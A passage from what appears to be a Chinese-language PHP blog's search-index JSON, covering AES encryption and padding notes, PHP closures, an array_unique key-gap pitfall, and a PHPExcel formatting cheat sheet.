href=\"/blog/2019/06/15/PHP-用-AES-加密解密結果作簽章不一樣-PKCS-一些加密雜記/web1.png\" title=\"備份圖\">備份圖</a><br>有驗證上面兩個函示，得出來結果都是相等的。<br>但注意，在上面 echo 出來，網頁或 log 上面都不會有字元<br>要看 var_dump 會比較準</li>\n</ul>\n<ul>\n<li><a href=\"https://my.oschina.net/luoxiaojun1992/blog/883123\" target=\"_blank\" rel=\"noopener\">AES/CBC/PKCS5Padding 的 PHP 实现 - luoxiaojun1992 的个人空间 - OSCHINA</a></li>\n</ul>\n<p>主要的填充算法有填充 NUL(“0”) 和 PKCS7，Mcrypt 默認使用的 NUL(“0”) 填充算法，當前已不被推薦，OpenSSL 則默認模式使用 PKCS7 對數據進行填充並對加密後的數據進行了 base64encode 編碼，所以建議開發中使用 PKCS7 對待加密數據進行填充，已保證通用性（alipay sdk 中雖然使用了 Mcrypt 加密簇，但使用 PKCS7 算法對數據進行了填充，這樣在一定程度上親和了 OpenSSL 加密算法）。</p>\n<p>原文網址：<a href=\"https://kknews.cc/zh-tw/other/9pgvlpl.html\" target=\"_blank\" rel=\"noopener\">https://kknews.cc/zh-tw/other/9pgvlpl.html</a></p>\n<p><a href=\"https://segmentfault.com/a/1190000016804661\" target=\"_blank\" rel=\"noopener\">php 如何 openssl_encrypt 加密解密 - 个人文章 - SegmentFault 思否</a><br>有說<code>OPENSSL_ZERO_PADDING</code>會自動填充<br>但測試結果沒有效果 OPENSSL_RAW_DATA 方式【会用 PKCS#7 进行补位】</p>\n<h2 id=\"簡單說我對簽章的定義\"><a href=\"#簡單說我對簽章的定義\" class=\"headerlink\" title=\"簡單說我對簽章的定義\"></a>簡單說我對簽章的定義</h2>\n<p>簽章主要目的加密，而是防止資料有被串改</p>\n<p>ebc 是沒有 iv 的，cbc 是有 iv 的<br>有用 iv 會比較安全，但是 iv 長度是有限制的<br><a href=\"https://github.com/lyhiving/aes\" target=\"_blank\" rel=\"noopener\">lyhiving/aes: 兼容 php、js、JAVA 的 AES 加密</a><br>詳細的我就沒研究</p>\n<p>當天跟所有公司留到半夜 4:30 回去，也許這就是技術債!!!<br>希望不要有上班回家的時候不要再看到太陽出來了</p>\n<p>題外小記<br>matrix 做翻書效果，搭配 向量矩陣 和<a href=\"https://www.xuanfengge.com/easeing/easeing/\" target=\"_blank\" rel=\"noopener\">缓动函数速查表</a><br>有很好展示效果</p>\n<p><a href=\"https://github.com/jlmakes/rematrix\" target=\"_blank\" rel=\"noopener\">jlmakes/rematrix: Matrix transformations made easy.</a><br><a href=\"http://www.useragentman.com/matrix/#E4UwziAuBCCumQPYDsBMBeASuKACAYosALYBkAZsIsQAwAe6NFVtAno6UvegMwAcAFk6Ia7AIwA2IZWpjxNJkjEMeAicLnpU25tVQMxC4fvQBWAOymAdAE47NiTYF9UA1GJvHxAnsJ4MfXyQedlVUUgATRB4AEXRIYFgQUgBLCLF0AGVYACNiFMhUiIxsCEKAC0hiABsAYRRIEGRIdAAeAAcAPgAVcpSwXH7cAENcHOrEAGMAa1wQapBiJsgrVoB6LoAoUkmwMHrm5fQ1gCpN3BOCEHncSmvcJDmIgpHkVlxEcgfykFwwSFYCwGOXmiAA7lZzic1ptNqc5sgwLBQCNqtVvr95otlgN-oCQBExqCwbhYBAxkQIiBgABaHKIOgXGFWcZTaYAGlwAGIAObANK4ADe51wovpdBpYBSAC8UsgeQAuCnAKm08UAbk2AF9YfDer9EDkAFYgSaQInkIi-F5DBLDRGWkgEpmbLmIMRCkVi4YzPmIWDICJKrnkciTcOTTU6uGXfUfY2m83DciNYCDc3lYbA67IB7Ae1gR1LQnQ12IVCe0Xe31UANB7kRyahqO6y71YjEFB-AFA25ECmMw0ms1gKwulkTGaVquW5qSmUgJVyn78yBR3Ct3C1TKZPtpyA-XB8gWl3n8wnCqtjH3TP11pXI6oACgARCliMMeeA1jkb3fA1YPIpOQL4AJS4KA7QgMM5pgJMVBorgNBIbgYJ9I0mpXj8KQ8pUSp8Ao7R0JhVbtIgUqQCkKBKqA1QwSkABuIAkaKiBMcA5ATGCSp9BEVLIC2RQ8FkuT5OaAAS3QALIADKvIS26ZEUAjoLU9qTPMRSmOgkwTBARQSDpekgEAA\" target=\"_blank\" rel=\"noopener\">The CSS3 Matrix Construction Set</a><br><a href=\"http://www.csie.ntnu.edu.tw/~u91029/LinearFunction.html\" target=\"_blank\" rel=\"noopener\">演算法筆記 - Linear Function</a></p>\n","categories":["PHP"],"tags":["php","aes"]},{"title":"PHP 閉包 function() use (xxx){}","url":"/blog/2018/08/12/PHP-%E9%96%89%E5%8C%85-function-use-xxx/","content":"<p>一直都不是看很懂，PHP閉包語法要怎麼看<br>之前有學JavaScript閉包，但不是很明白PHP閉包跟它插在哪裡<br>不過最近有爬到這篇<br><a id=\"more\"></a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//输出: This is a closure use string value lazy bind, msg is: Hello, everybody.&lt;br /&gt;/n  </span></span><br><span class=\"line\"><span class=\"comment\">//换一种引用方式, 我们使用引用的方式来use  </span></span><br><span class=\"line\"><span class=\"comment\">//可以发现这次输出是闭包定义后的值...  </span></span><br><span class=\"line\"><span class=\"comment\">//这个其实不难理解, 我们以引用方式use, 那闭包use的是$msg这个变量的地址  </span></span><br><span class=\"line\"><span class=\"comment\">//当后面对$msg这个地址上的值进行了改变之后, 闭包内再输出这个地址的值时, 自然改变了.  </span></span><br><span class=\"line\">$msg = <span class=\"string\">\"Hello, everyone\"</span>;  </span><br><span class=\"line\">$callback = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"params\">()</span> <span class=\"title\">use</span> <span class=\"params\">(&amp;$msg)</span> </span>&#123;  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"This is a closure use string value lazy bind, msg is: $msg. &lt;br /&gt;/n\"</span>;  </span><br><span class=\"line\">&#125;;  </span><br><span class=\"line\">$msg = <span class=\"string\">\"Hello, everybody\"</span>;  </span><br><span class=\"line\">callback($callback);</span><br></pre></td></tr></table></figure>\n<p>這個案例有點跟JavaScript閉包高達相似度<br>也能寫出跟JS閉包一樣的計時器<br>參考來源：<br><a href=\"https://blog.csdn.net/lgg201/article/details/6127564\" target=\"_blank\" rel=\"noopener\">php 5.3新增的闭包语法介绍function() use() {} - CSDN博客</a></p>\n","categories":["PHP"],"tags":["php","閉包"]},{"title":"PHP 陣列 array_unique 踩雷小記","url":"/blog/2019/04/21/PHP-%E9%99%A3%E5%88%97-array-unique-%E8%B8%A9%E9%9B%B7%E5%B0%8F%E8%A8%98/","content":"<p>最近用 array_unique<br><a href=\"https://www.php.net/manual/en/function.array-unique.php\" target=\"_blank\" rel=\"noopener\">PHP: array_unique - Manual</a><br>他可以過濾重複的內容<br>但不小心用出一個 bug</p>\n<p>例如有一個<code>$array = [0,1,2,2,3,4];</code><br>發現<code>array_unique(array);</code><br>var_dump 一看，key 發現有跳號</p>\n<a id=\"more\"></a>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$array = [<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">var_dump($array);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> PHP_EOL;</span><br><span class=\"line\">var_dump(array_unique($array));</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">array(6) &#123;</span><br><span class=\"line\">  [0]=&gt;</span><br><span class=\"line\">  int(0)</span><br><span class=\"line\">  [1]=&gt;</span><br><span class=\"line\">  int(1)</span><br><span class=\"line\">  [2]=&gt;</span><br><span class=\"line\">  int(2)</span><br><span class=\"line\">  [3]=&gt;</span><br><span class=\"line\">  int(2)</span><br><span class=\"line\">  [4]=&gt;</span><br><span class=\"line\">  int(3)</span><br><span class=\"line\">  [5]=&gt;</span><br><span class=\"line\">  int(4)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">array(5) &#123;</span><br><span class=\"line\">  [0]=&gt;</span><br><span class=\"line\">  int(0)</span><br><span class=\"line\">  [1]=&gt;</span><br><span class=\"line\">  int(1)</span><br><span class=\"line\">  [2]=&gt;</span><br><span class=\"line\">  int(2)</span><br><span class=\"line\">  [4]=&gt;</span><br><span class=\"line\">  int(3)</span><br><span class=\"line\">  [5]=&gt;</span><br><span class=\"line\">  int(4)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>所以這時候做<code>for($a = 0; $a &lt; count($a); $a++)</code>會有問題</p>\n<p>這邊有想到兩個做法</p>\n<ol>\n<li>改 foreach</li>\n<li>array_values(\\$array)</li>\n</ol>\n<p>可以解決</p>\n","categories":["PHP"],"tags":["php"]},{"title":"PHPExcel 使用小記","url":"/blog/2019/08/08/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/","content":"<p>最近做報表業務，有包含一些排版，對這些非常不熟<br>竟然都用了，紀錄一下我覺得實用筆記<br>PHPExcel 已經被廢棄了，取而代之的是<a href=\"https://github.com/PHPOffice/PhpSpreadsheet\" target=\"_blank\" rel=\"noopener\">PHPOffice/PhpSpreadsheet: A pure PHP library for reading and writing spreadsheet files</a><br>但這篇還是以 PHPExcel 為主</p>\n<a id=\"more\"></a>\n<p><a href=\"https://github.com/PHPOffice/PHPExcel\" target=\"_blank\" rel=\"noopener\">PHPOffice/PHPExcel: ARCHIVED</a></p>\n<p>PhpSpreadsheet 一些 note 可以看<a href=\"https://www.cnblogs.com/leestar54/p/7786806.html\" target=\"_blank\" rel=\"noopener\">phpspreadsheet 开发手记 - leestar54 - 博客园</a> <a href=\"/blog/2019/08/08/PHPExcel-使用小記/web1.png\" title=\"備份圖\">備份圖</a></p>\n<h2 id=\"載入-PHPEXCEL\"><a href=\"#載入-PHPEXCEL\" class=\"headerlink\" title=\"載入 PHPEXCEL\"></a>載入 PHPEXCEL</h2><p><a href=\"https://github.com/PHPOffice/PHPExcel/tree/1.8/Classes\" target=\"_blank\" rel=\"noopener\">PHPExcel/Classes at 1.8 · PHPOffice/PHPExcel</a></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/** PHPExcel */</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">\"lib/excel/PHPExcel.php\"</span>;</span><br><span class=\"line\"><span class=\"comment\">/** PHPExcel_IOFactory */</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">\"lib/excel/PHPExcel/IOFactory.php\"</span>;</span><br></pre></td></tr></table></figure>\n<h2 id=\"worksheet-工作表-設定\"><a href=\"#worksheet-工作表-設定\" class=\"headerlink\" title=\"worksheet(工作表)設定\"></a>worksheet(工作表)設定</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 建立工作表並指定名稱</span></span><br><span class=\"line\">$index = <span class=\"number\">0</span>;</span><br><span class=\"line\">$objPHPExcel-&gt;setActiveSheetIndex($index);  <span class=\"comment\">//設定預設顯示的工作表</span></span><br><span class=\"line\"><span class=\"comment\">// Rename sheet(sheet名稱)</span></span><br><span class=\"line\"><span class=\"comment\">// 重新命名 sheet 名稱</span></span><br><span class=\"line\">$month_date = substr($ym, <span class=\"number\">0</span>, <span class=\"number\">4</span>).<span class=\"string\">\".\"</span>.substr($ym, <span class=\"number\">-2</span>);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;setTitle($month_date);</span><br></pre></td></tr></table></figure>\n<h2 id=\"背景顏色設定\"><a href=\"#背景顏色設定\" class=\"headerlink\" title=\"背景顏色設定\"></a>背景顏色設定</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//設定背景顏色為\"鮮黃色\" (單色)</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A1:A2\"</span>)-&gt;applyFromArray(</span><br><span class=\"line\">    <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">\"fill\"</span> =&gt; <span class=\"keyword\">array</span>(</span><br><span class=\"line\">            <span class=\"string\">\"type\"</span> =&gt; PHPExcel_Style_Fill::FILL_SOLID,</span><br><span class=\"line\">            <span class=\"string\">\"color\"</span>=&gt; <span class=\"keyword\">array</span>(<span class=\"string\">\"rgb\"</span> =&gt; <span class=\"string\">\"FFFF00\"</span>) ),</span><br><span class=\"line\">    )</span><br><span class=\"line\">);</span><br><span class=\"line\"><span class=\"comment\">//設定背景顏色為\"淡黃色\"</span></span><br><span class=\"line\">$backcolor = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">'fill'</span> =&gt; <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">'type'</span> =&gt; PHPExcel_Style_Fill::FILL_SOLID,</span><br><span class=\"line\">        <span class=\"string\">'color'</span>=&gt; <span class=\"keyword\">array</span>(<span class=\"string\">'rgb'</span> =&gt; <span class=\"string\">'FFFFAB'</span>)</span><br><span class=\"line\">    ),</span><br><span class=\"line\">);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A1\"</span>)-&gt;applyFromArray($backcolor);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A3:B3\"</span>)-&gt;applyFromArray($backcolor);</span><br></pre></td></tr></table></figure>\n<h2 id=\"設定框線格式\"><a href=\"#設定框線格式\" class=\"headerlink\" title=\"設定框線格式\"></a>設定框線格式</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 設定框線格式</span></span><br><span class=\"line\"><span class=\"comment\">// 用陣列設定 全框線</span></span><br><span class=\"line\">$style_array = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">'borders'</span> =&gt; <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">'allborders'</span> =&gt; <span class=\"keyword\">array</span>(</span><br><span class=\"line\">            <span class=\"string\">'style'</span> =&gt; PHPExcel_Style_Border::BORDER_THIN,</span><br><span class=\"line\">            <span class=\"string\">'color'</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">'rgb'</span> =&gt; <span class=\"string\">'000000'</span>) ),</span><br><span class=\"line\">    )</span><br><span class=\"line\">);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A1:O\"</span>.$rows_count.<span class=\"string\">\"\"</span>)-&gt;applyFromArray($style_array);</span><br><span class=\"line\"><span class=\"comment\">// 下底線</span></span><br><span class=\"line\"><span class=\"comment\">// 總計很常用到</span></span><br><span class=\"line\">$bottom = <span class=\"keyword\">array</span>(</span><br><span class=\"line\"><span class=\"string\">'borders'</span> =&gt; <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">'bottom'</span>  =&gt; <span class=\"keyword\">array</span>(</span><br><span class=\"line\">        <span class=\"string\">'style'</span> =&gt; PHPExcel_Style_Border::BORDER_MEDIUM,</span><br><span class=\"line\">        <span class=\"string\">'color'</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">'rgb'</span> =&gt; <span class=\"string\">'000000'</span>) ),</span><br><span class=\"line\">)</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<h2 id=\"字體設定\"><a href=\"#字體設定\" class=\"headerlink\" title=\"字體設定\"></a>字體設定</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 設定字型大小</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A1\"</span>)-&gt;getFont()-&gt;setSize(<span class=\"number\">11</span>);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A2:B10\"</span>)-&gt;getFont()-&gt;setSize(<span class=\"number\">10</span>);</span><br><span class=\"line\"><span class=\"comment\">// 粗體</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A1:B2\"</span>)-&gt;getFont()-&gt;setBold(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A6:I6\"</span>)-&gt;getFont()-&gt;setBold(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"N2\"</span>)-&gt;getFont()-&gt;setBold(<span class=\"keyword\">false</span>);</span><br><span class=\"line\"><span class=\"comment\">// 動態算位置技巧</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A\"</span>.($rows_count).<span class=\"string\">\":O\"</span>.($rows_count).<span class=\"string\">\"\"</span>)-&gt;getFont()-&gt;setBold(<span class=\"keyword\">true</span>);</span><br><span class=\"line\"><span class=\"comment\">// 自動換行</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A3:B3\"</span>)-&gt;getAlignment()-&gt;setWrapText(<span class=\"keyword\">true</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"欄位給予值\"><a href=\"#欄位給予值\" class=\"headerlink\" title=\"欄位給予值\"></a>欄位給予值</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//設定A1欄位顯示文字2015-08</span></span><br><span class=\"line\">$month_date = substr($ym, <span class=\"number\">0</span>, <span class=\"number\">4</span>).<span class=\"string\">\"-\"</span>.substr($ym, <span class=\"number\">-2</span>);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;setCellValue(<span class=\"string\">\"A1\"</span>, $month_date );</span><br></pre></td></tr></table></figure>\n<h2 id=\"欄位類型\"><a href=\"#欄位類型\" class=\"headerlink\" title=\"欄位類型\"></a>欄位類型</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//設定成數字</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getCell(<span class=\"string\">\"B20\"</span>)-&gt;setValueExplicit(<span class=\"number\">1000</span>, PHPExcel_Cell_DataType::TYPE_NUMERIC);</span><br><span class=\"line\"><span class=\"comment\">//設定成百分比</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"B20\"</span>)-&gt;getNumberFormat()-&gt;setFormatCode(PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE_00);</span><br></pre></td></tr></table></figure>\n<h2 id=\"欄位對齊方式\"><a href=\"#欄位對齊方式\" class=\"headerlink\" title=\"欄位對齊方式\"></a>欄位對齊方式</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//水平對齊 setVertiacl 垂直對齊 setHorizontal</span></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">VERTICAL_CENTER 垂直置中</span></span><br><span class=\"line\"><span class=\"comment\">VERTICAL_TOP</span></span><br><span class=\"line\"><span class=\"comment\">HORIZONTAL_CENTER</span></span><br><span class=\"line\"><span class=\"comment\">HORIZONTAL_RIGHT</span></span><br><span class=\"line\"><span class=\"comment\">HORIZONTAL_LEFT</span></span><br><span class=\"line\"><span class=\"comment\">HORIZONTAL_JUSTIFY</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A1:B3\"</span>)-&gt;getAlignment()-&gt;setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A1:B3\"</span>)-&gt;getAlignment()-&gt;setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A1:A\"</span>.$rows_count.<span class=\"string\">\"\"</span>)-&gt;getAlignment()-&gt;setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"B1:B\"</span>.$rows_count.<span class=\"string\">\"\"</span>)-&gt;getAlignment()-&gt;setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">* 合併儲存格</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;mergeCells(<span class=\"string\">\"A1:B1\"</span>);</span><br><span class=\"line\"><span class=\"comment\">// or</span></span><br><span class=\"line\">$objPHPExcel-&gt;setActiveSheetIndex(<span class=\"number\">0</span>)-&gt;mergeCells(<span class=\"string\">'A1:C1'</span>);</span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">* 取消 合併儲存格</span></span><br><span class=\"line\"><span class=\"comment\">**/</span></span><br><span class=\"line\"><span class=\"comment\">// [How to Merge/unmerge cells in PHPExcel | Degree Documentation](https://degreedocumentation.wordpress.com/2012/08/17/how-to-mergeunmerge-cells/)</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;unmergeCells(<span class=\"string\">'A18:E22'</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"字體顏色\"><a href=\"#字體顏色\" class=\"headerlink\" title=\"字體顏色\"></a>字體顏色</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 設定字體顏色</span></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">這裡有列出可用英文單字表示的顏色，並不多。</span></span><br><span class=\"line\"><span class=\"comment\">COLOR_BLACK</span></span><br><span class=\"line\"><span class=\"comment\">COLOR_BLUE</span></span><br><span class=\"line\"><span class=\"comment\">COLOR_DARKBLUE</span></span><br><span class=\"line\"><span class=\"comment\">COLOR_DARKGREEN</span></span><br><span class=\"line\"><span class=\"comment\">COLOR_DARKRED</span></span><br><span class=\"line\"><span class=\"comment\">COLOR_DARKYELLOW</span></span><br><span class=\"line\"><span class=\"comment\">COLOR_GREEN</span></span><br><span class=\"line\"><span class=\"comment\">COLOR_RED</span></span><br><span class=\"line\"><span class=\"comment\">COLOR_WHITE</span></span><br><span class=\"line\"><span class=\"comment\">COLOR_YELLOW</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\">$gray = <span class=\"keyword\">array</span>(</span><br><span class=\"line\"><span class=\"string\">'font'</span>  =&gt; <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">'color'</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">'rgb'</span> =&gt; <span class=\"string\">'BABABA'</span>),</span><br><span class=\"line\">));</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"I1:I7\"</span>)-&gt;applyFromArray($gray);</span><br><span class=\"line\"></span><br><span class=\"line\">$yellow = <span class=\"keyword\">array</span>(</span><br><span class=\"line\"><span class=\"string\">'fill'</span>  =&gt; <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"string\">'type'</span> =&gt; PHPExcel_Style_Fill::FILL_SOLID,</span><br><span class=\"line\">    <span class=\"string\">'color'</span> =&gt; <span class=\"keyword\">array</span>(<span class=\"string\">'rgb'</span> =&gt; <span class=\"string\">'FFFF00'</span>),</span><br><span class=\"line\">));</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"F1:F2\"</span>)-&gt;applyFromArray($yellow);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"I2\"</span>)-&gt;applyFromArray($yellow);</span><br></pre></td></tr></table></figure>\n<h2 id=\"欄位寬度、高度設定\"><a href=\"#欄位寬度、高度設定\" class=\"headerlink\" title=\"欄位寬度、高度設定\"></a>欄位寬度、高度設定</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//設定 cell 高度</span></span><br><span class=\"line\"><span class=\"comment\">// 设置默认行高 getDefaultRowDimension</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getDefaultRowDimension()-&gt;setRowHeight(<span class=\"number\">12</span>);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getRowDimension(<span class=\"number\">1</span>)-&gt;setRowHeight(<span class=\"number\">16</span>);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getRowDimension(<span class=\"number\">2</span>)-&gt;setRowHeight(<span class=\"number\">16</span>);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getRowDimension(<span class=\"number\">3</span>)-&gt;setRowHeight(<span class=\"number\">36</span>);</span><br><span class=\"line\"><span class=\"comment\">//設定的欄位寬度(+0.71才正確)</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getColumnDimension(<span class=\"string\">'A'</span>)-&gt;setWidth(<span class=\"number\">17</span>);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getColumnDimension(<span class=\"string\">'B'</span>)-&gt;setWidth(<span class=\"number\">6</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"欄位數值資料格式\"><a href=\"#欄位數值資料格式\" class=\"headerlink\" title=\"欄位數值資料格式\"></a>欄位數值資料格式</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 網底</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"A1\"</span>)-&gt;getFill()-&gt;setFillType(PHPExcel_Style_Fill::FILL_PATTERN_LIGHTTRELLIS);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 設定成數字，並且有千分位逗號</span></span><br><span class=\"line\"><span class=\"comment\">// excel格式設定裡的#：代表數字，多餘的0會去掉。</span></span><br><span class=\"line\"><span class=\"comment\">// excel格式設定裡的0:基本上跟#一樣，但是多餘的0會保留。</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"D4:D\"</span>.($rows_count).<span class=\"string\">\"\"</span>)-&gt;getNumberFormat()-&gt;setFormatCode(<span class=\"string\">'#,##0'</span>);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"O4:O\"</span>.($rows_count).<span class=\"string\">\"\"</span>)-&gt;getNumberFormat()-&gt;setFormatCode(<span class=\"string\">'$#,##0'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 設定成百分比</span></span><br><span class=\"line\"><span class=\"comment\">// 設定拆款百分比30.00%</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"E3:E\"</span>.($rows_count).<span class=\"string\">\"\"</span>)-&gt;getNumberFormat()-&gt;setFormatCode(PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE_00);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"G3:G\"</span>.($rows_count).<span class=\"string\">\"\"</span>)-&gt;getNumberFormat()-&gt;setFormatCode(PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE_00);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getStyle(<span class=\"string\">\"H3:H\"</span>.($rows_count).<span class=\"string\">\"\"</span>)-&gt;getNumberFormat()-&gt;setFormatCode(PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;getCell(<span class=\"string\">'H4'</span>)-&gt;setValueExplicit(<span class=\"string\">'0.3'</span>, PHPExcel_Cell_DataType::TYPE_NUMERIC);</span><br></pre></td></tr></table></figure>\n<h2 id=\"凍結窗格\"><a href=\"#凍結窗格\" class=\"headerlink\" title=\"凍結窗格\"></a>凍結窗格</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//凍結窗格</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;freezePane(<span class=\"string\">'A6'</span>);</span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;freezePane(<span class=\"string\">'D6'</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"建立新的\"><a href=\"#建立新的\" class=\"headerlink\" title=\"建立新的\"></a>建立新的</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$objPHPExcel-&gt;createSheet(); <span class=\"comment\">//建立新的工作表</span></span><br><span class=\"line\">$objPHPExcel-&gt;setActiveSheetIndex($index+<span class=\"number\">1</span>);<span class=\"comment\">//現編輯頁</span></span><br><span class=\"line\">$objPHPExcel-&gt;getActiveSheet()-&gt;setTitle(<span 